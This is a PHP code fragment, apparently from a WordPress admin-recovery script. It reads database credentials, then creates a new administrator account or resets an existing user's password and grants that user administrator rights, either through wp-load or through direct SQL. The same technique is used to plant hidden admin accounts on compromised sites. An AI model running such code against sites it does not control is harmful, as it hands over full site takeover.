function ba_get_db_config($base, $manual)
{
    if ($manual !== null) {
        if (!$manual['ok']) {
            return $manual;
        }
        if (!empty($manual['prefix'])) {
            return array(
                'ok'          => true,
                'db'          => $manual['db'],
                'prefix'      => $manual['prefix'],
                'config_file' => '(manual input)',
                'source'      => 'manual',
            );
        }
        $conn = ba_connect($manual['db']);
        if (!$conn['ok']) {
            return $conn;
        }
        $pref = ba_guess_prefix($conn['mysqli']);
        $conn['mysqli']->close();
        return array(
            'ok'          => true,
            'db'          => $manual['db'],
            'prefix'      => $pref,
            'config_file' => '(manual input, prefix auto)',
            'source'      => 'manual',
        );
    }
    $cfg = ba_parse_wpconfig($base);
    if ($cfg['ok']) {
        $cfg['source'] = 'config';
    }
    return $cfg;
}

function ba_connect($db)
{
    if (!class_exists('mysqli')) {
        return array('ok' => false, 'msg' => 'Ekstensi mysqli tidak aktif di PHP');
    }
    if (ba_is_unresolved_var($db['host'])) {
        return array('ok' => false, 'msg' => 'DB Host masih variabel (' . $db['host'] . '). Ganti manual ke localhost lalu Test lagi.');
    }
    $m = @new mysqli($db['host'], $db['user'], $db['pass'], $db['name']);
    if ($m->connect_error) {
        return array('ok' => false, 'msg' => 'DB connect: ' . $m->connect_error);
    }
    @$m->set_charset('utf8mb4');
    return array('ok' => true, 'mysqli' => $m);
}

function ba_hash_password($base, $pass)
{
    $ph = $base . '/wp-includes/class-phpass.php';
    if (is_file($ph)) {
        require_once $ph;
        if (class_exists('PasswordHash')) {
            $hasher = new PasswordHash(8, true);
            return $hasher->HashPassword($pass);
        }
    }
    if (function_exists('password_hash')) {
        $hash = @password_hash($pass, PASSWORD_BCRYPT);
        if ($hash) {
            return $hash;
        }
    }
    return md5($pass);
}

function ba_via_wpload($base, $user, $pass, $email)
{
    if (!ba_is_cli()) {
        return array('ok' => false, 'msg' => 'wp-load hanya untuk CLI; web pakai mysqli langsung');
    }
    $load = $base . '/wp-load.php';
    if (!is_file($load)) {
        return array('ok' => false, 'msg' => 'wp-load.php tidak ada');
    }
    if (!defined('WP_USE_THEMES')) {
        define('WP_USE_THEMES', false);
    }
    require_once $load;
    if (!function_exists('wp_create_user')) {
        return array('ok' => false, 'msg' => 'wp_create_user tidak tersedia');
    }
    if (username_exists($user)) {
        $u = get_user_by('login', $user);
        if ($u) {
            wp_set_password($pass, $u->ID);
            $obj = new WP_User($u->ID);
            $obj->set_role('administrator');
            return array(
                'ok'   => true,
                'msg'  => 'User sudah ada - password direset + role administrator',
                'user' => $user,
                'pass' => $pass,
                'id'   => $u->ID,
                'via'  => 'wp-load (reset)',
            );
        }
        return array('ok' => false, 'msg' => 'User sudah ada');
    }
    $id = wp_create_user($user, $pass, $email);
    if (is_wp_error($id)) {
        return array('ok' => false, 'msg' => $id->get_error_message());
    }
    $obj = new WP_User($id);
    $obj->set_role('administrator');
    return array(
        'ok'   => true,
        'msg'  => 'Admin baru berhasil dibuat',
        'user' => $user,
        'pass' => $pass,
        'id'   => $id,
        'via'  => 'wp-load',
    );
}

function ba_via_mysqli($base, $user, $pass, $email, $manual = null)
{
    $cfg = ba_get_db_config($base, $manual);
    if (!$cfg['ok']) {
        return $cfg;
    }
    $pref = $cfg['prefix'];
    $db = $cfg['db'];
    $hash = ba_hash_password($base, $pass);
    $conn = ba_connect($db);
    if (!$conn['ok']) {
        return $conn;
    }
    $m = $conn['mysqli'];
    $u = $m->real_escape_string($user);
    $e = $m->real_escape_string($email);
    $h = $m->real_escape_string($hash);
    $cap = $m->real_escape_string($pref . 'capabilities');
    $lvl = $m->real_escape_string($pref . 'user_level');
    $rs = $m->query("SELECT ID FROM {$pref}users WHERE user_login='$u' LIMIT 1");
    if ($rs && $rs->num_rows > 0) {
        $row = $rs->fetch_assoc();
        $id = (int) $row['ID'];
        $m->query("UPDATE {$pref}users SET user_pass='$h', user_email='$e' WHERE ID=$id");
        $m->query("DELETE FROM {$pref}usermeta WHERE user_id=$id AND meta_key IN ('$cap','$lvl')");
        $m->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '$cap', 'a:1:{s:13:\"administrator\";b:1;}')");
        $m->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '$lvl', '10')");
        $m->close();
        return array(
            'ok'   => true,
            'msg'  => 'User sudah ada - password direset via DB',
            'user' => $user,
            'pass' => $pass,
            'id'   => $id,
            'via'  => 'mysqli (reset)',
        );
    }
    $m->query("INSERT INTO {$pref}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
        VALUES ('$u', '$h', '$u', '$e', NOW(), 0, 'Recovery Admin')");
    $id = (int) $m->insert_id;
    if ($id < 1) {
        $err = $m->error;
        $m->close();
        return array('ok' => false, 'msg' => 'INSERT user gagal: ' . $err);
    }
    $m->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '$cap', 'a:1:{s:13:\"administrator\";b:1;}')");
    $m->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '$lvl', '10')");
    $m->close();
    return array(
        'ok'   => true,
        'msg'  => 'Admin baru dibuat via database',
        'user' => $user,
        'pass' => $pass,
        'id'   => $id,
        'via'  => 'mysqli',
    );
}

